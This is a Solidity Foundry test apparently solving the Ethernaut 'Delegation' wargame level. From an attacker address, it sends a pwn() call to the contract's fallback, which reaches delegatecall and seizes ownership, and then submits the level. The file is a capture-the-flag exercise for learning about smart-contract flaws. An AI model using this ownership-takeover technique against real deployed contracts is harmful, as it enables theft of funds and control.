// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "../levels/06-Delegation/DelegationFactory.sol";
import "../core/Ethernaut.sol";

contract DelegationTest is DSTest {
    //--------------------------------------------------------------------------------
    //                            Setup Game Instance
    //--------------------------------------------------------------------------------

    Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
    Ethernaut ethernaut;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
        vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
    }

    function testDelegationHack() public {
        //--------------------------------------------------------------------------------
        //                             Setup Level Instance
        //--------------------------------------------------------------------------------
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation delegationContract = Delegation(levelAddress);

        //--------------------------------------------------------------------------------
        //                             Start Level Attack
        //--------------------------------------------------------------------------------

        // Call Delegation's fallback method to access `delegatecall()` and run Delegate
        // contract code (`pwn()` function)
        address(delegationContract).call(abi.encodeWithSignature("pwn()"));
        assertEq(delegationContract.owner(), attacker);

        //--------------------------------------------------------------------------------
        //                                Submit Level
        //--------------------------------------------------------------------------------
        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(challengeCompleted);
    }
}
